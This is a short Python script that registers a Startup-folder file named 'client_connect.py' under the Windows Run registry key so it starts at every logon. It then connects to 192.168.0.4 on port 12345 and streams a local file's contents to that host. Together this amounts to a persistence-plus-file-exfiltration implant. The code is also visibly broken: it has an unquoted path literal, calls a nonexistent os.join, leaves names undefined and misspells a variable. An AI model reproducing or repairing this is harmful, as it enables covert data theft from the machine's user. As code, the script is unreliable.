# Python code to add current script to the registry 
  
# module to edit the windows registry  
import winreg as reg  
import os              
  
def AddToRegistry(): 
  
    # in python __file__ is the instant of 
    # file path where it was executed  
    # so if it was executed from desktop, 
    # then __file__ will be  
    # c:\users\current_user\desktop 
    pth = os.path.dirname(os.path.realpath(C:\Users\Jarrett\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)) 
      
    # name of the python file with extension 
    s_name="client_connect.py"     
      
    # joins the file name to end of path address 
    address=os.join(pth,s_name)  
      
    # key we want to change is HKEY_CURRENT_USER  
    # key value is Software\Microsoft\Windows\CurrentVersion\Run 
    key = HKEY_CURRENT_USER 
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
      
    # open the key to make changes to 
    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
      
    # modifiy the opened key 
    reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address) 
      
    # now close the opened key 
    reg.CloseKey(open) 
  
# Driver Code 
if __name__=="__main__": 
    AddToRegistry()
    
# Import socket module 
import socket                
  
# Create a socket object 
s = socket.socket()          
  
# Define the port on which you want to connect 
port = 12345                
  
# connect to the server on local computer 
s.connect(('192.168.0.4', port)) 

data = s.recv(1024)

#test filename, this will have to be changed
filename = 'Test1.txt'

f = open(filename,'rb')
tranfer = f.read(1024)
while (transfer):
    s.send(transfer)
    transfer = read(1024)
f.close()
            
# close the connection 
s.close() 
